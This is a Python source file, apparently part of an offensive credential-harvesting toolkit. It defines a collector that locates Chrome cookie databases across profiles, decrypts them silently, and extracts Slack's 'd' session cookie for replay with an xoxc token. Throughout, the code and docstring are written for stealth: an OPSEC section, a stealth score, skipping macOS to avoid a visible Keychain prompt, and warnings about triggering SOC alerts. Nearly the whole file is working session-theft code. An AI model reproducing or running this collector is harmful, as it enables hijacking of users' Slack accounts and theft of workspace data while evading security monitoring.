"""Slack browser cookie collector — extracts d cookie via Chromium decrypt.

Extracts the Slack `d` session cookie from Chrome's encrypted Cookies database.
The `d` cookie is required alongside an xoxc token for Slack API calls using
browser session credentials.

OPSEC:
  - Windows/Linux: SILENT (DPAPI / hardcoded 'peanuts' key)
  - macOS: SKIPPED by default (Keychain prompt is user-visible)
  - NOTE: Using the d cookie for API calls may trigger SOC alerts
"""

from __future__ import annotations

from typing import List

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import chrome_user_data_dir, get_platform


_SLACK_HOST_PATTERNS = [".slack.com"]
_SLACK_COOKIE_NAMES = {"d"}


@CollectorRegistry.register
class SlackBrowserCookiesCollector(BaseCollector):
    service = "slack"
    source = "browser_cookies"
    stealth_score = 5
    requires = ["cryptography"]
    platforms = ["windows", "linux"]  # Skip macOS — Keychain prompt

    def discover(self) -> List[DiscoveredToken]:
        """Check if Chrome Cookies DB exists with Slack cookies."""
        results = []
        chrome_dir = chrome_user_data_dir()

        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
        for profile in profiles:
            cookies_db = chrome_dir / profile / "Cookies"
            if not cookies_db.exists():
                cookies_db = chrome_dir / profile / "Network" / "Cookies"

            if cookies_db.exists():
                results.append(DiscoveredToken(
                    service=self.service,
                    source=self.source,
                    path=str(cookies_db),
                    account_hint=f"chrome:{profile}",
                    stealth_score=self.stealth_score,
                    details=(
                        "Slack d cookie (browser session); "
                        f"platform={get_platform()}"
                    ),
                ))

        return results

    def collect(self) -> List[CollectedToken]:
        """Extract and decrypt Slack d cookie from Chrome."""
        missing = self.check_dependencies()
        if missing:
            self._warn(
                f"Missing dependencies: {', '.join(missing)}. "
                f"Install with: pip install {' '.join(missing)}"
            )
            return []

        from ...core.chromium_decrypt import extract_cookies, get_chrome_key, DecryptError

        try:
            key = get_chrome_key(allow_prompt=False)
        except DecryptError as e:
            self._warn(f"Cannot get Chrome key: {e}")
            return []

        results = []
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]

        for profile in profiles:
            try:
                cookies = extract_cookies(
                    profile=profile,
                    host_patterns=_SLACK_HOST_PATTERNS,
                    key=key,
                )
            except DecryptError as e:
                self._warn(f"Failed to extract cookies from {profile}: {e}")
                continue
            except Exception as e:
                self._warn(f"Unexpected error extracting from {profile}: {e}")
                continue

            # Filter to the d cookie
            d_cookies = [c for c in cookies if c["name"] in _SLACK_COOKIE_NAMES]

            if not d_cookies:
                continue

            for d_cookie in d_cookies:
                # The d cookie value is the browser session token
                # It's URL-encoded and starts with xoxd-
                d_value = d_cookie["value"]

                results.append(CollectedToken(
                    service=self.service,
                    source=self.source,
                    stealth_score=self.stealth_score,
                    access_token=secure(d_value),
                    extra={
                        "profile": profile,
                        "cookie_name": "d",
                        "host": d_cookie["host"],
                        "path": d_cookie["path"],
                        "secure": d_cookie["secure"],
                        "httponly": d_cookie["httponly"],
                        "platform": get_platform(),
                        "note": (
                            "d cookie for xoxc token API calls. "
                            "WARNING: Using this may trigger SOC alerts."
                        ),
                    },
                ))

                self._info(
                    f"Extracted Slack d cookie from chrome:{profile} "
                    f"(host={d_cookie['host']})"
                )

        return results
